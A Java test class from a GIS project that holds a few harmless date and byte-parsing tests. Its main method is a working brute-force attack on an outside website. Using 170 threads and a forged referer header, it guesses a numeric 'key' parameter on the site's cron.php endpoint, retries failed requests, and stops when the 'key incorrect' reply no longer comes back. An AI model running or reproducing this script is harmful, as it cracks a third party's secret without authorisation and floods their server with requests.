package com.gyh.gis;

import lombok.extern.slf4j.Slf4j;
import org.junit.jupiter.api.Test;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.text.ParseException;
import java.time.Duration;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * create by GYH on 2022/9/27
 */
@Slf4j
public class BaseTest {

    @Test
    public void testTime() throws InterruptedException {
        LocalDateTime time = LocalDateTime.now().plusMonths(1).withDayOfYear(1).withHour(0).withMinute(0).withSecond(0).withNano(0);
        System.out.println(time);
    }

    static HttpClient httpClient = HttpClient.newHttpClient();

    public static void main(String[] args) throws InterruptedException {
        // 创建 HttpClient 实例（线程安全，可复用）

        // 使用 try-with-resources 确保 ExecutorService 自动关闭
        ExecutorService executor = new ThreadPoolExecutor(170, 170, 0L,
                TimeUnit.MINUTES, new LinkedBlockingQueue<>(), new ThreadPoolExecutor.CallerRunsPolicy());

        // 提交多个虚拟线程处理请求
        for (int i = 978130; i > 100000; i--) {
            query(executor, i);
        }

        // 自动调用 executor.shutdown() 并等待任务完成
        log.info("{}", executor.awaitTermination(1, TimeUnit.DAYS));
    }

    public static void query(ExecutorService executor, int finalI) {
        executor.execute(() -> {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("http://7.by777.top/cron.php?do=inbr&key=" + finalI))
                    .header("referer", "http://7.by777.top/")
                    .timeout(Duration.ofSeconds(50))
                    .build();

            try {
                // 发送同步请求，虚拟线程在此处自动挂起，不阻塞 OS 线程
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());

                // 处理响应
                if (response.statusCode() == 200) {
                    if (response.body().equals("监控密钥不正确")) {
                        log.info("失败 {} {}", finalI, response.body());
                    } else {
                        log.info("成功{} {}", finalI, response.body());
                        executor.shutdownNow();
                    }
                } else {
                    log.info("请求失败，状态码: {} >>>>>>>>> 重新提交 {}", response.statusCode(), finalI);
                    query(executor, finalI);
                }
            } catch (Exception e) {
                log.info("请求异常: {} 重新提交 {}", e.getMessage(), finalI);
                query(executor, finalI);
            }
        });
    }

    @Test
    public void testBase() {
        byte[] body = new byte[]{0x02, 0x06, 0x6A};
        int length = body[0];
        int data = 0;
        for (int i = 1; i <= length; i++) {
            data = (data << 8) + body[i];
        }
        System.out.println(data);
    }

    @Test
    public void testTime2() throws ParseException {
        DateTimeFormatter fmt = DateTimeFormatter.ofPattern("yyyy/MM/dd月");
        System.out.println(fmt.format(LocalDateTime.now()));
//        System.out.println(df.parse("2022-10-12 13:00:51").getTime());
    }
}
